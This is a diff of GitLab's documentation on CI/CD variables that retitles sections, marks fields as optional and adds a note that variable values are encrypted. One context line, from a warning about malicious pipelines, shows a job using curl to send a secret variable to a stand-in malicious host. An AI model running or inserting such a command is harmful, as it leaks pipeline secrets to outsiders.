@@ -123,7 +123,7 @@ Use the [`value` and `description`](../yaml/README.md#prefill-variables-in-manua
 keywords to define [variables that are prefilled](../pipelines/index.md#prefill-variables-in-manual-pipelines)
 for [manually-triggered pipelines](../pipelines/index.md#run-a-pipeline-manually).
 
-### Project CI/CD variables
+### Add a CI/CD variable to a project
 
 You can add CI/CD variables to a project's settings. Only project members with
 [maintainer permissions](../../user/permissions.md#project-members-permissions)
@@ -138,7 +138,7 @@ To add or update variables in the project settings:
    - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
    - **Value**: No limitations.
    - **Type**: [`File` or `Variable`](#cicd-variable-types).
-   - **Environment scope**: `All`, or specific [environments](../environments/index.md).
+   - **Environment scope**: (Optional) `All`, or specific [environments](../environments/index.md).
    - **Protect variable** (Optional): If selected, the variable is only available
      in pipelines that run on protected branches or tags.
    - **Mask variable** (Optional): If selected, the variable's **Value** is masked
@@ -161,10 +161,9 @@ The output is:
 
 ![Output custom variable](img/custom_variables_output.png)
 
-### Group CI/CD variables
+### Add a CI/CD variable to a group
 
-> - Introduced in GitLab 9.4.
-> - Support for [environment scopes](https://gitlab.com/gitlab-org/gitlab/-/issues/2874) added to GitLab Premium in 13.11
+> Support for [environment scopes](https://gitlab.com/gitlab-org/gitlab/-/issues/2874) added to GitLab Premium in 13.11
 
 To make a CI/CD variable available to all projects in a group, define a group CI/CD variable.
 
@@ -181,14 +180,16 @@ To add a group variable:
    - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
    - **Value**: No limitations.
    - **Type**: [`File` or `Variable`](#cicd-variable-types).
-   - **Environment scope** (optional): `All`, or specific [environments](#limit-the-environment-scope-of-a-cicd-variable). **(PREMIUM)**
+   - **Environment scope** (Optional): `All`, or specific [environments](#limit-the-environment-scope-of-a-cicd-variable). **(PREMIUM)**
    - **Protect variable** (Optional): If selected, the variable is only available
      in pipelines that run on protected branches or tags.
    - **Mask variable** (Optional): If selected, the variable's **Value** is masked
      in job logs. The variable fails to save if the value does not meet the
      [masking requirements](#mask-a-cicd-variable).
 
-To view the group-level variables available in a project:
+#### View all group-level variables available in a project
+
+To view all the group-level variables available in a project:
 
 1. In the project, go to **Settings > CI/CD**.
 1. Expand the **Variables** section.
@@ -198,7 +199,7 @@ inherited.
 
 ![CI/CD settings - inherited variables](img/inherited_group_variables_v12_5.png)
 
-### Instance CI/CD variables
+### Add a CI/CD variables to an instance
 
 > - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/14108) in GitLab 13.0.
 > - [Feature flag removed](https://gitlab.com/gitlab-org/gitlab/-/issues/299879) in GitLab 13.11.
@@ -337,6 +338,10 @@ build:
     - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
 ```
 
+Variable values are encrypted using [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
+and stored in the database. This data can only be read and decrypted with a
+valid [secrets file](../../raketasks/backup_restore.md#when-the-secrets-file-is-lost).
+
 ### Custom variables validated by GitLab
 
 Some variables are listed in the UI so you can choose them more quickly.
@@ -392,9 +397,9 @@ job_name:
     - D:\\qislsf\\apache-ant-1.10.5\\bin\\ant.bat "-DsosposDailyUsr=$env:SOSPOS_DAILY_USR" portal_test
 ```
 
-### Windows Batch
+### Use variables wtih Windows Batch
 
-To access environment variables in Windows Batch, surround the variable
+To access CI/CD variables in Windows Batch, surround the variable
 with `%`:
 
 ```yaml
